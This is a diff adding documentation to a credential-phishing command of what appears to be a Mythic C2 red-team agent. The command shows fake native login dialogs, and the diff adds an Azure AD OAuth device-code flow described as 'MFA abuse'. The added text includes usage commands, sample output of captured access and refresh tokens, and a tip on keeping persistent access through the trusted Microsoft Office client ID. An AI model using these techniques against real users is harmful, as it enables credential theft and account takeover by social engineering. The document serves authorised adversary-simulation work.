@@ -17,9 +17,12 @@ Display a native credential dialog to capture user credentials. Uses platform-na
 
 | Argument | Required | Default | Description |
 |----------|----------|---------|-------------|
+| action | No | dialog | `dialog` (native credential prompt) or `device-code` (OAuth MFA abuse) |
 | title | No | "Windows Security" (Win) / "Update Required" (macOS) / "Authentication Required" (Linux) | Dialog title bar text |
 | message | No | "Enter your credentials to continue." (Win) / "macOS needs your password..." (macOS) / "Enter your password to continue." (Linux) | Body text displayed in the dialog |
 | icon | No | caution | Dialog icon (macOS only): caution, note, or stop |
+| tenant_id | No | organizations | Azure AD tenant ID for device-code flow |
+| client_id | No | Microsoft Office | OAuth client ID for device-code flow |
 
 ## Usage
 
@@ -91,6 +94,48 @@ Dialog:   Authentication Required (zenity)
 - Empty password submissions are detected and reported
 - Credentials are automatically stored in Mythic's credential vault as plaintext
 
+### OAuth Device Code Flow (MFA Abuse)
+
+Initiate an Azure AD OAuth Device Code Flow to capture OAuth tokens without knowing the user's password. The agent generates a code that must be entered at `https://microsoft.com/devicelogin`. If the target user authenticates (e.g., via social engineering, MFA fatigue), the agent captures access and refresh tokens.
+
+```
+# Default: Microsoft Office client, multi-tenant
+credential-prompt -action device-code
+
+# Target specific tenant
+credential-prompt -action device-code -tenant_id "contoso.onmicrosoft.com"
+
+# Use custom OAuth client ID
+credential-prompt -action device-code -client_id "your-app-id" -tenant_id "tenant-id"
+```
+
+### Example Output (device-code)
+
+```
+=== OAuth Device Code Flow (MFA Fatigue) ===
+
+User Code:   ABCD-EFGH
+URL:         https://microsoft.com/devicelogin
+Expires:     900 seconds
+Client ID:   d3590ed6-52b3-4102-aeff-aad2292ab01c
+Tenant:      organizations
+
+Polling for authentication...
+
+[+] USER AUTHENTICATED — Tokens captured!
+
+Token Type:    Bearer
+Scope:         https://graph.microsoft.com/.default
+Expires In:    3599 seconds
+
+Access Token:  eyJ0eXAiOiJKV1QiLCJub...
+Refresh Token: 0.ARoAJR7nxF2V3US...
+```
+
+{{% notice tip %}}The refresh token provides persistent access — it can be used to generate new access tokens without re-authenticating. Default client ID (Microsoft Office) is trusted by most Azure AD tenants without admin consent.{{% /notice %}}
+
 ## MITRE ATT&CK Mapping
 
 - **T1056.002** — Input Capture: GUI Input Capture
+- **T1621** — Multi-Factor Authentication Request Generation
+- **T1111** — Multi-Factor Authentication Interception
